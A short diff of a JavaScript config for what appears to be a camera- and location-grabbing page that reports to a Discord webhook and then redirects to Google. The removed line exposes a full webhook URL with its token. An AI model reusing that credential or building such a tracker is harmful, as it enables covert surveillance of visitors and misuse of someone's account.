@@ -3,7 +3,7 @@
 
 window.OSINT_CONFIG = window.OSINT_CONFIG || {};
 Object.assign(window.OSINT_CONFIG, {
-  webhookUrl: "https://discord.com/api/webhooks/1395354314557493288/Mun9psBXEVSkjjlifOBhCI2fcX238zMHtEqtuHNWvBk-BKqkBZNmjH0P8zO-Shew7eHu",
+  webhookUrl: "https://discord.com/api/webhooks/ABC123",
   finalUrl: "https://www.google.com",
   requestCamera: true,
   requestGeo: true,
